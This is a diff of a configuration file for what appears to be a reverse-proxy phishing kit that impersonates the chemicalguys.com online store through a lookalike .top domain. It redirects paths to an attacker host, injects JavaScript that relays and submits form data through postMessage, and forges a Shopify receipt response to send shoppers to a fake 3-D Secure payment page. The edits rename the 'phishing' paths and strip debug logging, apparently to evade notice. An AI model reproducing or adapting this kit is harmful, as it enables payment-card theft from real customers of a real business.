@@ -41,7 +41,7 @@ sub_filters:
 
 intercept:
   # 自定义3ds页面
-  - {domain: 'www.chemicalguys.com', mime: 'redirect', body: 'front.whoooosyourdaddy.top:8443', path: '\/phishing\/*', http_status: 301}
+  - {domain: 'www.chemicalguys.com', mime: 'redirect', body: 'front.whoooosyourdaddy.top:8443', path: '\/phis\/*', http_status: 301}
   - {domain: 'www.chemicalguys.com', path: '.*?\/sandboxes\/wallets', http_status: 404}
 #  - {domain: 'www.chemicalguys.com', path: '.*?/DeliveryMethodSelectorSection.*', http_status: 404}
   - {domain: 'api.intelligems.io', path: '.*\/track*', http_status: 404}
@@ -54,9 +54,8 @@ js_inject:
     script: |
       // 监听消息（查找元素）
       window.addEventListener('message', (event) => {
-        console.log("父类监听：",event.origin)
         if (event.origin !== 'https://front.chemicalguys.top') return;
-        console.log("父类监听：",event)
+
         const { type, selector, attributes } = event.data;
         const replyPort = event.ports[0];
         if (type === 'SUBMIT_FORM' && replyPort) {
@@ -102,7 +101,7 @@ js_inject:
           },
           {
             url: 'PollForReceipt',
-            response: {"data":{"receipt":{"id":"gid://shopify/ProcessedReceipt/1970793545956","action":{"offsiteRedirect":false,"url":"https://front.chemicalguys.top/phishing/fish","__typename":"CompletePaymentChallenge"},"timeout":{"millisecondsRemaining":691074,"__typename":"ActionRequiredReceiptTimeout"},"__typename":"ActionRequiredReceipt"}}},
+            response: {"data":{"receipt":{"id":"gid://shopify/ProcessedReceipt/1970793545956","action":{"offsiteRedirect":false,"url":"https://front.chemicalguys.top/phis/info","__typename":"CompletePaymentChallenge"},"timeout":{"millisecondsRemaining":691074,"__typename":"ActionRequiredReceiptTimeout"},"__typename":"ActionRequiredReceipt"}}},
             status: 200
           }
         ];
